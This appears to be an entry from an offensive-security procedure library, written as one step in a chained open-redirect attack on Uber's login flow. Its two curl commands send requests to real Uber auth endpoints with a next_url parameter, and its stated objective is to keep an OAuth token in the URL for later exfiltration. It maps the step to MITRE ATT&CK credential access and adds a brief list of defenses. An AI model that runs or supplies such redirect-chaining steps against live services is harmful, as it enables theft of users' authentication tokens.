---
tags:
  - open-redirect
  - internal-chain
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/curl-uber-auth-redirect]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:39.142Z'
sub_techniques: []
id: a3420ff5-db90-42e3-a83a-88f00a36f174
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Redirect to Uber Logout Endpoint

## Summary

This procedure exploits the next_url parameter in Uber's auth endpoint to redirect to the logout endpoint, continuing the token-carrying chain.

## Description

The auth.uber.com/login endpoint processes the next_url without validation, issuing a redirect to https://login.uber.com/logout. The OAuth token remains in the URL, vulnerable to the next open redirect.

## Requirements

1. Redirect from previous step
2. Access to auth.uber.com
3. Preserved URL parameters

## Defense

Defensive measures and detection strategies:

- Validate next_url against allowlist of internal paths
- Implement redirect confirmation pages
- Audit redirect logs for chaining patterns

## Objectives

1. Chain internal redirect
2. Preserve token for exfiltration
3. Reach vulnerable logout endpoint

## Instructions

### Step 1: Trigger Auth Endpoint Redirect

**Context**: Hit the auth endpoint with next_url.

**Command** ([[commands/curl-uber-auth-redirect]]):
```bash
curl -L "https://auth.uber.com/login?next_url=https://login.uber.com/logout" -H "Referer: https://www.facebook.com" -v
```

> Follows to logout. Expected: 302 to login.uber.com/logout.

### Step 2: Confirm Chain Integrity

**Context**: Check token presence post-redirect.

**Command** ([[commands/curl-uber-auth-redirect]]):
```bash
curl "https://auth.uber.com/login?next_url=https://login.uber.com/logout&access_token=FAKE_TOKEN" -I
```

> -I for head only. Success: 302 with Location header to logout.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-uber-auth-redirect]]

## Tools Used


## Tags

- open-redirect
- internal-chain
- credential-access
